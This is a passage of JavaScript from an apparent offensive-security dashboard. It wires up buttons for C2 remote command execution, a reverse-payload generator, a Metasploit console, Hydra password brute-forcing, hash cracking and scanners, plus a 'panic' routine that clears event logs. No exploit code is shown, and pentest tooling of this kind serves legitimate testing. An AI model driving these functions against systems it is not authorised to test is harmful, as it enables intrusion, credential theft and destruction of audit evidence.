    const shares=Array.isArray(d)?d:d.data||[];
    if(shares.length){shares.forEach(s=>{const e=document.createElement('div');e.className='smb-share';e.innerHTML='<span class="sn">'+s.Name+'</span><span class="sp">'+(s.Path||'')+'</span><span class="su">'+(s.Users!==undefined?s.Users+' user(s)':'')+'</span>';list.appendChild(e)})}
    else list.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">No shares found</div>'
  }catch(e){document.getElementById('smb-local-list').innerHTML='<div style="color:var(--accent-danger)">Failed to load</div>'}
}
async function scanSmb(){
  const ip=document.getElementById('smb-target').value.trim();
  if(!ip){showToast('SMB','Enter an IP','warn');return}
  document.getElementById('smb-remote-list').innerHTML='<div style="color:var(--text-dim)">Scanning...</div>';
  document.getElementById('smb-remote-title').style.display='block';
  try{
    const r=await fetch('/smb/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})});
    const d=await r.json();
    const list=document.getElementById('smb-remote-list');list.innerHTML='';
    if(d.shares&&d.shares.length){d.shares.forEach(s=>{const e=document.createElement('div');e.className='smb-share';e.innerHTML='<span class="sn">'+s.name+'</span><span class="sp">'+s.type+'</span>';list.appendChild(e)});showToast('SMB','Found '+d.shares.length+' shares on '+ip,'success')}
    else list.innerHTML='<div style="color:var(--text-dim)">No shares found on '+ip+'</div>'
  }catch(e){document.getElementById('smb-remote-list').innerHTML='<div style="color:var(--accent-danger)">Scan failed</div>'}
}

// ── Watchdog System ─────────────────────────────────────────────────────
async function opWatchdogs(){
  termWriteln('Opened Watchdogs panel','tinfo');
  switchTab('watchdogs');
  refreshWatchdogs()
}
async function refreshWatchdogs(){
  const list=document.getElementById('wd-list');
  const side=document.getElementById('wd-sidebar-list');
  try{
    const r=await fetch('/watch/list');const wds=await r.json();
    list.innerHTML='';side.innerHTML='';
    if(!wds||!wds.length){list.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">No watchdogs active. Add one above.</div>';side.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.38rem,.45vw,.55rem)">none active</div>';return}
    wds.forEach(w=>{
      // Main tab card
      const c=document.createElement('div');c.className='wd-card'+(w.triggered?' wd-triggered':'');
      c.innerHTML='<div class="wdh"><span class="wdn">'+w.name+'</span><span class="wdt">'+w.type.toUpperCase()+'</span></div><div class="wds">target: '+(w.target||'-')+' | last: '+w.last_check+(w.triggered?' | <span style="color:var(--accent-danger)">TRIGGERED</span>':'')+'</div>';
      const rm=document.createElement('button');rm.className='wd-action';rm.textContent='Remove';
      rm.onclick=async function(){await fetch('/watch/'+w.id,{method:'DELETE'});refreshWatchdogs()};
      c.querySelector('.wdh').appendChild(rm);list.appendChild(c);
      // Sidebar card
      const sc=document.createElement('div');sc.className='wd-card'+(w.triggered?' wd-triggered':'');sc.style.padding='clamp(3px,.3vh,5px)';sc.style.marginBottom='3px';
      sc.innerHTML='<div class="wdh"><span class="wdn" style="font-size:clamp(.4rem,.48vw,.58rem)">'+w.name+'</span><span class="wds" style="font-size:clamp(.35rem,.4vw,.5rem)">'+w.type+(w.triggered?' &#9888;':'')+'</span></div>';
      side.appendChild(sc)
    })
  }catch(e){}
}
async function addWatchdog(){
  const name=prompt('Watchdog name:');
  if(!name)return;
  const type=document.getElementById('wd-type').value;
  const target=document.getElementById('wd-target').value.trim();
  try{
    const r=await fetch('/watch/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,type,target})});
    const d=await r.json();
    if(d.ok){showToast('Watchdog','Added: '+name,'success');refreshWatchdogs();document.getElementById('wd-target').value=''}
    else showToast('Watchdog','Error: '+d.error,'alert')
  }catch(e){showToast('Watchdog','Failed','alert')}
}

// ── Network Stats Poller ────────────────────────────────────────────────
async function updateNetStats(){
  try{
    const r=await fetch('/net/stats');const d=await r.json();
    document.getElementById('ns-conn').textContent=d.connections||0
  }catch(e){}
}
setInterval(updateNetStats,10000);updateNetStats();

// ── Keyboard Shortcuts ──────────────────────────────────────────────────
document.addEventListener('keydown',function(e){
  if(e.target.tagName==='INPUT')return;
  switch(e.key){
    case'1':switchTab('terminal');break;
    case'2':switchTab('chat');break;
    case'3':switchTab('results');break;
    case'4':switchTab('processes');break;
    case'5':switchTab('services');break;
    case'6':switchTab('smb');break;
    case'7':switchTab('watchdogs');break;
    case'Escape':closeDevicePanel();break;
    case'n':case'N':runOp('netscan');break;
    case'p':case'P':runOp('portscan');break;
    case's':case'S':runOp('smb');break;
  }
});
function switchTab(name){
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
  const btn=document.querySelector('.tab-btn[data-tab="'+name+'"]');
  if(btn)btn.classList.add('active');
  const panel=document.getElementById('tp-'+name);
  if(panel)panel.classList.add('active')
}

// ── HUD Net Stats Data Scroll ─────────────────────────────────────────

// ── Emergency Panic ─────────────────────────────────────────────────
async function triggerPanic(){
  if(!confirm('EMERGENCY PANIC: This will kill user processes, clear event logs, and enable firewall. Continue?'))return;
  document.getElementById('panic-btn').textContent='PANICKING...';
  document.getElementById('panic-btn').style.animation='none';
  try{
    const r=await fetch('/panic',{method:'POST'});const d=await r.json();
    showToast('&#9888; PANIC','Emergency actions executed','alert');
    if(d.killed)showToast('Panic','Killed '+d.killed.length+' processes','success');
    if(d.logs)showToast('Panic','Event logs cleared','success');
    showToast('Panic','Firewall enabled','success');
  }catch(e){showToast('Panic','Failed: '+e,'alert')}
  document.getElementById('panic-btn').textContent='&#9888; PANIC'
}

// ── C2 Remote ────────────────────────────────────────────────────────
let _c2Sid = null;
async function opC2(){termWriteln('Opened C2 Remote panel','tinfo');switchTab('c2');listC2Sessions()}
async function listC2Sessions(){
  try{
    const r=await fetch('/c2/sessions');const s=await r.json();
    const div=document.getElementById('c2-sessions');div.innerHTML='';
    if(!s||!s.length){div.innerHTML='<div style="color:var(--text-dim);font-size:clamp(.4rem,.5vw,.6rem)">No active C2 sessions.</div>';return}
    let h='<table class="c2-table"><thead><tr><th>ID</th><th>IP</th><th>User</th><th>Connected</th><th></th></tr></thead><tbody>';
    s.forEach(ses=>{
      const sid=ses.id||ses.ip;
      h+='<tr><td>'+sid.slice(0,8)+'</td><td>'+ses.ip+'</td><td>'+ses.user+'</td><td>'+(ses.connected?new Date(ses.connected*1000).toLocaleTimeString():'-')+'</td><td><button class="c2-kill" onclick="c2Kill(\''+sid+'\')">X</button></td></tr>'
    });
    h+='</tbody></table>';div.innerHTML=h
  }catch(e){}
}
async function c2Connect(){
  const host=document.getElementById('c2-host').value.trim();
  const cred=document.getElementById('c2-cred').value.trim();
  if(!host)return showToast('C2','Enter a hostname or IP','alert');
  try{
    const r=await fetch('/c2/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:host,user:cred,pwd:''})});
    const d=await r.json();
    if(d.ok){_c2Sid=d.id;showToast('C2','Connected to '+d.hostname,'success');listC2Sessions()}
    else showToast('C2','Connection failed: '+(d.error||d.raw||'unknown'),'alert')
  }catch(e){showToast('C2','Error: '+e,'alert')}
}
async function c2Exec(){
  const cmd=document.getElementById('c2-cmd').value.trim();
  if(!cmd||!_c2Sid)return showToast('C2','Enter a command and connect first','alert');
  try{
    const r=await fetch('/c2/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:_c2Sid,command:cmd})});
    const d=await r.json();
    document.getElementById('c2-output').textContent=d.ok?d.output:'ERROR: '+(d.error||'')
  }catch(e){document.getElementById('c2-output').textContent='ERROR: '+e}
}
async function c2Kill(sid){
  try{await fetch('/c2/session/'+sid,{method:'DELETE'});listC2Sessions()}catch(e){}
}

// ── Payload Workshop ──────────────────────────────────────────────────
let _plCode = '';
async function opPayload(){termWriteln('Opened Payload Workshop panel','tinfo');switchTab('payload')}
async function generatePayload(){
  const type=document.getElementById('pl-type').value;
  const ip=document.getElementById('pl-ip').value.trim();
  const port=document.getElementById('pl-port').value.trim();
  if(!ip||!port)return showToast('Payload','Enter IP and port','alert');
  try{
    const r=await fetch('/payload/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,ip,port})});
    const d=await r.json();
    if(d.ok){_plCode=d.payload;document.getElementById('pl-output').textContent=d.payload;showToast('Payload',d.type+' generated','success')}
    else showToast('Payload','Error: '+d.error,'alert')
  }catch(e){showToast('Payload','Error: '+e,'alert')}
}
async function copyPayload(){
  if(!_plCode)return showToast('Payload','Nothing to copy','alert');
  try{await navigator.clipboard.writeText(_plCode);showToast('Payload','Copied to clipboard','success')}catch(e){showToast('Payload','Copy failed','alert')}
}

// ── Active Probe ─────────────────────────────────────────────────────
async function opProbe(){termWriteln('Opened Probe panel','tinfo');switchTab('probe')}
async function probeDevice(){
  const ip=document.getElementById('probe-ip').value.trim();
  if(!ip)return showToast('Probe','Enter an IP','alert');
  try{
    const r=await fetch('/probe/'+ip);const d=await r.json();
    const area=document.getElementById('probe-results-area');area.innerHTML='';
    if(d.error){area.innerHTML='<div class="probe-result critical"><div class="prr">Error: '+d.error+'</div></div>';return}
    // Threat score
    const sc=document.createElement('div');sc.className='probe-threat';sc.textContent='THREAT SCORE: '+d.threat_score+'/100';area.appendChild(sc);
    // Findings
    if(d.findings&&d.findings.length){
      d.findings.forEach(f=>{
        const c=document.createElement('div');
        let cls='probe-result ';
        if(f.result==='CRITICAL')cls+='critical';else if(f.result==='VULNERABLE'||f.result==='EXPOSED')cls+='vulnerable';else if(f.result==='POTENTIAL')cls+='potential';else cls+='secure';
        c.className=cls;
        c.innerHTML='<div class="prh"><span class="prs">'+f.service+'</span><span>'+f.test+'</span></div><div class="prr">'+f.result+'</div><div class="prd">'+f.detail+'</div>';
        area.appendChild(c)
      })
    }else area.innerHTML+='<div class="probe-result" style="color:var(--text-dim)">No findings. Device appears clean.</div>'
  }catch(e){showToast('Probe','Error: '+e,'alert')}
}

// ── Op Report ─────────────────────────────────────────────────────────
async function opReport(){termWriteln('Opened Op Report panel','tinfo');switchTab('report')}
async function opTraffic(){termWriteln('Opened Live Traffic panel','tinfo');switchTab('traffic');updateTraffic()}
async function generateReport(){
  const btn=document.querySelector('.report-btn');btn.textContent='GENERATING...';
  const out=document.getElementById('report-output');out.style.display='flex';
  const prev=document.getElementById('report-preview');prev.textContent='Generating report...';
  try{
    const r=await fetch('/report');const d=await r.json();
    if(d.ok){prev.textContent=d.report;const dl=document.getElementById('report-dl');dl.href='data:text/markdown;charset=utf-8,'+encodeURIComponent(d.report);dl.download=d.filename;showToast('Report','Generated: '+d.filename,'success')}
    else prev.textContent='Error: '+d.error
  }catch(e){prev.textContent='Error: '+e}
  btn.textContent='&#9776; GENERATE OP REPORT'
}

// ── System Stats Poller ───────────────────────────────────────────────
async function updateSysStats(){
  try{
    const r=await fetch('/system/stats');const d=await r.json();
    document.getElementById('sys-cpu').textContent=d.cpu+'%';
    document.getElementById('sys-cpu-bar').style.width=d.cpu+'%';
    document.getElementById('sys-mem').textContent=d.memory+'%';
    document.getElementById('sys-mem-bar').style.width=d.memory+'%';
    document.getElementById('sys-dsk').textContent=d.disk+'%';
    document.getElementById('sys-dsk-bar').style.width=d.disk+'%';
    document.getElementById('sys-cpu2').textContent=d.cpu+'%';
    document.getElementById('sys-mem2').textContent=d.memory+'%';
    document.getElementById('sys-dsk2').textContent=d.disk+'%';
  }catch(e){}
}
setInterval(updateSysStats,3000);updateSysStats();

// ── Traffic Graph ─────────────────────────────────────────────────────
async function updateTraffic(){
  try{
    const r=await fetch('/traffic/top');const d=await r.json();
    const tbody=document.getElementById('traffic-tbody');tbody.innerHTML='';
    if(d.connections&&d.connections.length){
      d.connections.forEach(c=>{
        const tr=document.createElement('tr');
        tr.innerHTML='<td class="tv">'+c.Remote+'</td><td>'+c.Count+'</td><td>'+c.Ports+'</td>';
        tbody.appendChild(tr)
      })
    }else{
      tbody.innerHTML='<tr><td colspan="3" style="color:var(--text-dim)">No active connections</td></tr>'
    }
    renderTrafficGraph(d)
  }catch(e){}
}
let _trafficHistory=[];
function renderTrafficGraph(d){
  const c=document.getElementById('traffic-canvas');
  if(!c)return;
  const ctx=c.getContext('2d');
  const r=c.parentElement.getBoundingClientRect();
  c.width=r.width*c.devicePixelRatio||400;c.height=(r.height||80)*c.devicePixelRatio;
  c.style.width=(r.width||400)+'px';c.style.height=(r.height||80)+'px';
  ctx.scale(c.width/400,c.height/80);
  const now=Date.now();
  _trafficHistory.push({t:now,v:d.total||0});
  _trafficHistory=_trafficHistory.slice(-60);
  ctx.clearRect(0,0,400,80);
  ctx.strokeStyle='rgba(0,240,255,.3)';ctx.lineWidth=1;
  ctx.beginPath();
  _trafficHistory.forEach((p,i)=>{
    const x=i/(_trafficHistory.length-1)*398+1;
    const y=78-(p.v/(Math.max(..._trafficHistory.map(p=>p.v))||1))*70;
    i===0?ctx.moveTo(x,y):ctx.lineTo(x,y)
  });
  ctx.stroke();
  ctx.fillStyle='rgba(0,240,255,.02)';
  ctx.lineTo(398,78);ctx.lineTo(1,78);ctx.closePath();ctx.fill()
}
setInterval(updateTraffic,5000);updateTraffic();

// ── Threat Ticker ─────────────────────────────────────────────────────
async function updateThreats(){
  try{
    const r=await fetch('/threats');const d=await r.json();
    const inner=document.getElementById('threat-ticker-inner');
    if(!d.threats||!d.threats.length){inner.innerHTML='<span class="tt-item" style="color:var(--accent-success)">&#9679; NO ACTIVE THREATS DETECTED</span>';return}
    inner.innerHTML=d.threats.map(t=>{
      const sev=t.severity||'info';
      const icon=sev==='alert'?'&#9888;':sev==='warn'?'&#9881;':'&#9679;';
      return '<span class="tt-item"><span class="tts '+sev+'"></span>'+icon+' '+t.detail+' @ '+t.source+' ['+t.timestamp+']</span>'
    }).join('')
  }catch(e){}
}
setInterval(updateThreats,15000);updateThreats();

// ── Weather / Geo Widget ──────────────────────────────────────────────
let _weatherCache=0;
async function updateWeather(){
  if(Date.now()-_weatherCache<60000)return;_weatherCache=Date.now();
  try{
    const r=await fetch('/weather');const d=await r.json();
    document.getElementById('hw-temp').textContent=(d.temp!==undefined?d.temp+'°':'--');
    document.getElementById('hw-cond').textContent=d.condition||''
  }catch(e){}
}
setInterval(updateWeather,120000);updateWeather();

// ── Radial Menu ───────────────────────────────────────────────────────
const RADIAL_ITEMS=[
  {icon:'&#9733;',label:'Scan',op:'netscan'},
  {icon:'&#9878;',label:'Ports',op:'portscan'},
  {icon:'&#9888;',label:'Panic',op:'panic'},
  {icon:'&#9776;',label:'Procs',op:'processes'},
  {icon:'&#9880;',label:'Probe',op:'probe'},
  {icon:'&#9762;',label:'MSF',op:'msf'},
  {icon:'&#9783;',label:'Web',op:'webscan'},
  {icon:'&#9881;',label:'Tools',op:'tools'},
  {icon:'&#9775;',label:'C2',op:'c2'}
];
let _radialOpen=false;
function toggleRadialMenu(e){
  e.stopPropagation();
  _radialOpen=!_radialOpen;
  const menu=document.getElementById('radial-menu');
  if(_radialOpen){
    const btn=e.currentTarget;const br=btn.getBoundingClientRect();
    let cx=br.left+br.width/2,cy=br.top+br.height/2;
    const radius=clamp(80,14,120);
    menu.innerHTML='';menu.classList.add('show');
    // Pre-compute item positions to detect overflow
    const items=[],labels=[],gap=23,itemSize=46,labelOff=18;
    RADIAL_ITEMS.forEach((item,i)=>{
      const angle=(i/RADIAL_ITEMS.length)*Math.PI*2-Math.PI/2;
      items.push({x:cx+Math.cos(angle)*radius-gap,y:cy+Math.sin(angle)*radius-gap,icon:item.icon,label:item.label,op:item.op})
    });
    // Compute bounding box and clamp center
    let minX=Infinity,minY=Infinity,maxX=-Infinity,maxY=-Infinity;
    items.forEach(function(it){
      if(it.x<minX)minX=it.x;if(it.y<minY)minY=it.y;
      if(it.x+itemSize>maxX)maxX=it.x+itemSize;if(it.y+itemSize>maxY)maxY=it.y+itemSize
    });
    var pad=10;
    if(minX<pad){var d=pad-minX;cx+=d;items.forEach(function(it){it.x+=d})}
    if(minY<pad){var d=pad-minY;cy+=d;items.forEach(function(it){it.y+=d})}
    if(maxX>window.innerWidth-pad){var d=window.innerWidth-pad-maxX;cx+=d;items.forEach(function(it){it.x+=d})}
    if(maxY>window.innerHeight-pad){var d=window.innerHeight-pad-maxY;cy+=d;items.forEach(function(it){it.y+=d})}
    // Render clamped items
    items.forEach(function(it){
      var el=document.createElement('div');el.className='rm-item';
      el.style.left=it.x+'px';el.style.top=it.y+'px';
      el.innerHTML=it.icon;el.title=it.label;
      el.onclick=function(ev){ev.stopPropagation();_radialOpen=false;menu.classList.remove('show');if(it.op==='panic')triggerPanic();else runOp(it.op)};
      menu.appendChild(el);
      var lb=document.createElement('div');lb.className='rm-label';
      lb.style.left=(it.x+labelOff)+'px';lb.style.top=(it.y-12)+'px';
      lb.textContent=it.label;menu.appendChild(lb)
    });
    document.addEventListener('click',_closeRadial,{once:true})
  }else{menu.classList.remove('show')}
}
function _closeRadial(){_radialOpen=false;document.getElementById('radial-menu').classList.remove('show')}
function clamp(v,min,max){return Math.max(min,Math.min(max,v))}

// ── Web Audio — Ambient Holographic Hum ───────────────────────────────
let _audioCtx=null;
function initAudio(){
  try{
    _audioCtx=new(window.AudioContext||window.webkitAudioContext)();
    const osc=_audioCtx.createOscillator();
    osc.type='sine';osc.frequency.value=55;
    const gain=_audioCtx.createGain();
    gain.gain.value=0.015;
    const filter=_audioCtx.createBiquadFilter();
    filter.type='lowpass';filter.frequency.value=200;
    osc.connect(filter);filter.connect(gain);gain.connect(_audioCtx.destination);
    osc.start();
    // Sub-bass drone
    const osc2=_audioCtx.createOscillator();
    osc2.type='sawtooth';osc2.frequency.value=27.5;
    const gain2=_audioCtx.createGain();gain2.gain.value=0.003;
    const filter2=_audioCtx.createBiquadFilter();
    filter2.type='lowpass';filter2.frequency.value=80;
    osc2.connect(filter2);filter2.connect(gain2);gain2.connect(_audioCtx.destination);
    osc2.start();
    window._kaiAudio=_audioCtx
  }catch(e){}
}
function playAlert(){
  if(!_audioCtx)return;
  try{
    const osc=_audioCtx.createOscillator();
    osc.type='square';osc.frequency.value=880;
    const gain=_audioCtx.createGain();
    gain.gain.setValueAtTime(0.06,_audioCtx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001,_audioCtx.currentTime+0.3);
    osc.connect(gain);gain.connect(_audioCtx.destination);
    osc.start();osc.stop(_audioCtx.currentTime+0.3)
  }catch(e){}
}
// Init audio on first user click
document.addEventListener('click',()=>{if(!_audioCtx)initAudio()},{once:true});

// ── Keyboard Shortcuts Update ─────────────────────────────────────────
document.addEventListener('keydown',function(e){
  if(e.target.tagName==='INPUT')return;
  switch(e.key){
    case'1':switchTab('terminal');break;
    case'2':switchTab('chat');break;
    case'3':switchTab('results');break;
    case'4':switchTab('processes');break;
    case'5':switchTab('services');break;
    case'6':switchTab('smb');break;
    case'7':switchTab('watchdogs');break;
    case'8':switchTab('c2');break;
    case'9':switchTab('payload');break;
    case'0':switchTab('probe');break;
    case'-':switchTab('traffic');break;
    case'=':switchTab('msf');break;
    case'+':switchTab('webscan');break;
    case'Escape':closeDevicePanel();closePopOuts();if(typeof _tourEnd==='function'&&document.querySelector('.tour-overlay.show'))_tourEnd();if(_radialOpen){_closeRadial()}else{var anyOp=Object.keys(_activeOps);if(anyOp.length){termCancelOp(anyOp[0])}}break;
    case'M':if(e.shiftKey){e.preventDefault();toggleMap()}break;
    case'n':case'N':runOp('netscan');break;
    case'p':case'P':runOp('portscan');break;
    case's':case'S':runOp('smb');break;
    case'm':case'M':runOp('msf');break;
    case'w':case'W':runOp('webscan');break;
    case'r':case'R':if(e.ctrlKey){e.preventDefault();switchTab('traffic')}break;
    case'?':e.preventDefault();showTour();break;
  }
});

// ── Drag-and-Drop Sidebar ─────────────────────────────────────────────
function initDrag(){
  document.querySelectorAll('.sidebar-title, .action-btn').forEach(el=>{
    el.draggable=true;
    el.addEventListener('dragstart',e=>{e.dataTransfer.setData('text/plain',null);el.classList.add('dragging')});
    el.addEventListener('dragend',e=>{el.classList.remove('dragging')});
    el.addEventListener('dragover',e=>{e.preventDefault()});
    el.addEventListener('drop',e=>{
      e.preventDefault();
      const drag=document.querySelector('.dragging');
      if(drag&&drag!==el&&el.parentElement===drag.parentElement){
        const rect=el.getBoundingClientRect();
        const next=(e.clientY-rect.top)/(rect.bottom-rect.top)>.5?el.nextSibling:el;
        drag.parentElement.insertBefore(drag,next)
      }
    })
  })
}

// ── Metasploit (msfconsole interactive) ─────────────────────────────────

async function opMsf(){termWriteln('Opened Metasploit panel','tinfo');switchTab('msf');msfStart()}

async function msfStart(){
  const status=document.getElementById('msf-status');
  const output=document.getElementById('msf-output');
  status.textContent='Starting...';
  output.textContent='Starting msfconsole...\n';
  try{
    const r=await fetch('/msf/start',{method:'POST'});const d=await r.json();
    if(d.ok){
      status.textContent='Running';
      output.textContent+='msfconsole interactive started.\nType "help" to begin.\n\n';
      setTimeout(msfListSessions,2000)
    }else{status.textContent='Error';output.textContent+='Error: '+d.error+'\n'}
  }catch(e){status.textContent='Error';output.textContent+='Error: '+e+'\n'}
}

async function msfStop(){
  try{
    await fetch('/msf/stop',{method:'POST'});
    document.getElementById('msf-status').textContent='Stopped';
    document.getElementById('msf-output').textContent+='\nmsfconsole stopped.\n';
    document.getElementById('msf-sessions').style.display='none'
  }catch(e){}
}

async function msfSendCommand(){
  const input=document.getElementById('msf-console-input');
  const cmd=input.value.trim();
  if(!cmd)return;
  input.value='';
  const out=document.getElementById('msf-output');
  out.textContent+='msf6 > '+cmd+'\n';
  try{
    const r=await fetch('/msf/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,timeout:60})});
    const d=await r.json();
    if(d.output){out.textContent+=d.output;out.scrollTop=out.scrollHeight}
    else if(d.error){out.textContent+='Error: '+d.error+'\n'}
  }catch(e){out.textContent+='Error: '+e+'\n'}
  msfListSessions()
}

async function msfListSessions(){
  try{
    const r=await fetch('/msf/sessions');const d=await r.json();
    const list=document.getElementById('msf-session-list');
    const section=document.getElementById('msf-sessions');
    const sessions=d.sessions||{};
    const keys=Object.keys(sessions);
    if(keys.length){section.style.display='block';list.innerHTML=keys.map(k=>{
      const s=sessions[k];
      return '<div style="display:flex;gap:8px;align-items:center;padding:2px 0;border-bottom:1px solid var(--border);font-size:.7rem">'
        +'<span style="color:var(--cyan-bright)">#'+k+'</span>'
        +'<span style="color:var(--text-dim)">'+(s.raw||'')+'</span>'
        +'</div>'
    }).join('')}else section.style.display='none'
  }catch(e){}
}
setInterval(msfListSessions,10000);

// ── ZAP Web Scanner ────────────────────────────────────────────────────
async function opWebScan(){termWriteln('Opened Web Scan panel','tinfo');switchTab('webscan')}

async function zapStart(){
  try{
    const r=await fetch('/zap/start',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
    const d=await r.json();
    document.getElementById('zap-status').textContent=d.ok?'Running':'Error';
    showToast('ZAP',d.message||d.error,'info');
    if(d.ok){const sr=await fetch('/zap/status');const sd=await sr.json();if(sd.version)document.getElementById('zap-output').textContent='ZAP '+(sd.version.version||'')+'\nReady.'}
  }catch(e){showToast('ZAP','Error: '+e,'alert')}
}

async function zapStop(){
  try{
    const r=await fetch('/zap/stop',{method:'POST'});const d=await r.json();
    document.getElementById('zap-status').textContent='Stopped';
    showToast('ZAP',d.message||d.error,'info')
  }catch(e){showToast('ZAP','Error: '+e,'alert')}
}

async function zapStartScan(){
  const url=document.getElementById('zap-url').value.trim();
  if(!url)return showToast('ZAP','Enter a URL','alert');
  const out=document.getElementById('zap-output');
  out.textContent='Starting spider scan: '+url+'\n';
  try{
    const r=await fetch('/zap/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})});
    const d=await r.json();
    if(d.ok){out.textContent+='Spider ID: '+d.spider_id+'\n';zapPollSpider(d.spider_id)}
    else{out.textContent+='Error: '+(d.error||JSON.stringify(d))+'\n'}
  }catch(e){out.textContent+='Error: '+e+'\n'}
}

async function zapPollSpider(id){
  try{
    const r=await fetch('/zap/spider/status/'+id);const d=await r.json();
    const p=d.status||'0';
    document.getElementById('zap-spider-progress').textContent=p+'%';
    if(p!=='100'){setTimeout(()=>zapPollSpider(id),2000)}
  }catch(e){}
}

async function zapStartActiveScan(){
  const url=document.getElementById('zap-url').value.trim();
  if(!url)return showToast('ZAP','Enter a URL','alert');
  const out=document.getElementById('zap-output');
  out.textContent+='Starting active scan: '+url+'\n';
  try{
    const r=await fetch('/zap/ascan/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})});
    const d=await r.json();
    if(d.ok){out.textContent+='Active Scan ID: '+d.scan_id+'\n';zapPollActiveScan(d.scan_id)}
    else{out.textContent+='Error: '+(d.error||JSON.stringify(d))+'\n'}
  }catch(e){out.textContent+='Error: '+e+'\n'}
}

async function zapPollActiveScan(id){
  try{
    const r=await fetch('/zap/ascan/status/'+id);const d=await r.json();
    const p=d.status||'0';
    document.getElementById('zap-ascan-progress').textContent=p+'%';
    if(p!=='100'){setTimeout(()=>zapPollActiveScan(id),3000)}else{zapGetAlerts()}
  }catch(e){}
}

async function zapFullScan(){
  const url=document.getElementById('zap-url').value.trim();
  if(!url)return showToast('ZAP','Enter a URL','alert');
  const out=document.getElementById('zap-output');
  out.textContent='Starting full scan: '+url+'\n';
  try{
    const r=await fetch('/zap/fullscan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})});
    const d=await r.json();
    if(d.ok){out.textContent+=JSON.stringify(d.result,null,2)+'\n';zapGetAlerts()}
    else{out.textContent+='Error: '+(d.error||JSON.stringify(d))+'\n'}
  }catch(e){out.textContent+='Error: '+e+'\n'}
}

async function zapGetAlerts(){
  const url=document.getElementById('zap-url').value.trim();
  const out=document.getElementById('zap-output');
  try{
    const body=url?JSON.stringify({url:url}):'{}';
    const r=await fetch('/zap/alerts',{method:'POST',headers:{'Content-Type':'application/json'},body:body});
    const d=await r.json();
    const summary=d.summary||{};
    const summaryEl=document.getElementById('zap-alert-summary');
    summaryEl.innerHTML='<span style="color:var(--accent-danger)">High: '+(summary.High||0)+'</span>'
      +'<span style="color:var(--accent-warn)">Medium: '+(summary.Medium||0)+'</span>'
      +'<span style="color:var(--accent-info)">Low: '+(summary.Low||0)+'</span>'
      +'<span style="color:var(--text-dim)">Info: '+(summary.Informational||0)+'</span>';
    const alerts=d.alerts&&d.alerts.alerts;
    if(alerts&&alerts.length){
      out.textContent='=== ALERTS ===\n';
      alerts.forEach(a=>{
        out.textContent+='['+a.risk+'] '+a.alert+'\n  URL: '+a.url+'\n  '+a.description.slice(0,200)+'\n  Solution: '+a.solution.slice(0,200)+'\n\n'
      })
    }else out.textContent+='\nNo alerts found.\n'
  }catch(e){out.textContent+='Error fetching alerts: '+e+'\n'}
}

async function zapReport(){
  try{
    const r=await fetch('/zap/report/html');const html=await r.text();
    const w=window.open('');w.document.write(html);w.document.title='ZAP Report'
  }catch(e){showToast('ZAP','Error: '+e,'alert')}
}

// ── Tool Kit ────────────────────────────────────────────────────────────
async function opTools(){termWriteln('Opened Tool Kit panel','tinfo');switchTab('tools')}

async function _tkRun(tool,params){
  const out=document.getElementById('tk-output');
  out.textContent+='Running '+tool+'...\n';
  try{
    const r=await fetch('/tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:tool,params:params,timeout:120})});
    const d=await r.json();
    if(d.ok){
      out.textContent+='Command: '+d.command+'\n';
      if(d.stdout)out.textContent+=d.stdout.slice(0,3000)+'\n';
      if(d.stderr)out.textContent+='STDERR: '+d.stderr.slice(0,1000)+'\n';
    }else out.textContent+='Error: '+(d.error||JSON.stringify(d))+'\n';
    out.scrollTop=out.scrollHeight
  }catch(e){out.textContent+='Error: '+e+'\n'}
}

async function tkHydra(){
  const target=document.getElementById('tk-hydra-target').value.trim();
  if(!target)return showToast('Hydra','Enter a target','alert');
  _tkRun('hydra',{
    target:target,
    service:document.getElementById('tk-hydra-service').value,
    username:document.getElementById('tk-hydra-user').value.trim()||'root',
    wordlist:document.getElementById('tk-hydra-wordlist').value.trim()||'/usr/share/wordlists/rockyou.txt',
  })
}

async function tkNetcat(){
  const target=document.getElementById('tk-nc-target').value.trim();
  const port=document.getElementById('tk-nc-port').value.trim();
  const mode=document.getElementById('tk-nc-mode').value;
  if((mode==='scan'||mode==='banner')&&!target)return showToast('Netcat','Enter a target','alert');
  if(!port)return showToast('Netcat','Enter port(s)','alert');
  _tkRun('netcat',{mode:mode,target:target,port:port})
}

async function tkCrack(){
  const hash=document.getElementById('tk-hash').value.trim();
  if(!hash)return showToast('Hash Cracker','Enter a hash','alert');
  const type=document.getElementById('tk-hash-type').value;
  _tkRun(type,{hash:hash})
}

async function tkSearchsploit(){
  const q=document.getElementById('tk-search').value.trim();
  if(!q)return showToast('Searchsploit','Enter a query','alert');
  _tkRun('searchsploit',{query:q})
}

async function tkNmap(){
  const target=document.getElementById('tk-nmap-target').value.trim();
  const flags=document.getElementById('tk-nmap-flags').value.trim()||'-sn';
  if(!target)return showToast('Nmap','Enter a target','alert');
  _tkRun('nmap',{target:target,flags:flags})
}

// ── Interactive Tour ─────────────────────────────────────────────────
const TOUR_STEPS=[
  {target:'#hud-bar',title:'K//AI Command Deck',text:'Welcome to your operations center. This HUD shows live system gauges, status, weather, and your controls.',pos:'bottom'},
  {target:'#sidebar-left',title:'Operations Sidebar',text:'Each button launches a tool. Click any to start — 10-second cooldown prevents spamming.',pos:'right'},
  {target:'[data-op="netscan"]',title:'Network Scan',text:'Discover live hosts on your LAN. Press <span class="kb-hint">N</span> anytime.',pos:'right'},
  {target:'[data-op="msf"]',title:'Metasploit',text:'Interactive msfconsole — exploits, sessions, pivots. Press <span class="kb-hint">M</span>.',pos:'right'},
